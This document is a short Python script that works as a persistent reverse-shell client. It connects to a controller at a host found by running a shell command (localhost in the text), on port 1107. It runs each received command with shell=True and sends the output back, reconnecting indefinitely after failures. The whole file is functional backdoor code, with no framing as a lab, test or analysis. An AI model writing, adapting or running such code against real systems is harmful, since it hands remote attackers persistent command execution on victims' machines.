#!/usr/bin/env python3
import sys
import time
import socket
import subprocess


def connect_socket(host, port):
    st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        st.connect((host, port))
    except BaseException as e:
        pass
    return st


def run_command(cmd, timeout=10):
    count = 0.
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    try:
        while process.poll() is None:
            time.sleep(0.2)
            count += 0.2
            if count > timeout:
                std = "timeout: {0}".format(cmd)
                process.terminate()
                break
        else:
            std = process.stdout.read().decode("utf-8", "ignore") + process.stderr.read().decode("utf-8", "ignore")
            process.terminate()
    except BaseException as e:
        std = "exception: {0}".format(cmd)
        process.terminate()
    return std


def wait(seconds):
    try:
        time.sleep(seconds)
    except KeyboardInterrupt as e:
        print(e)
        sys.exit()
    except BaseException as e:
        pass


def main():
    host_cmd = "echo 127.0.0.1"
    host = run_command(host_cmd).strip()
    port = 1107
    st = connect_socket(host, port)
    error_times = 0

    while True:
        try:
            cmd = st.recv(8192).decode("utf-8", "ignore")
            std = run_command(cmd)
            st.send(std.encode("utf-8", "ignore"))
        except socket.error as e:
            print(e)
            st.close()
            wait(3)
            error_times += 1
            if error_times % 200 == 0:
                error_times = 0
                host = run_command(host_cmd).strip()
            st = connect_socket(host, port)
        except BaseException as e:
            print(e)
            wait(3)
        wait(1)


if __name__ == '__main__':
    main()
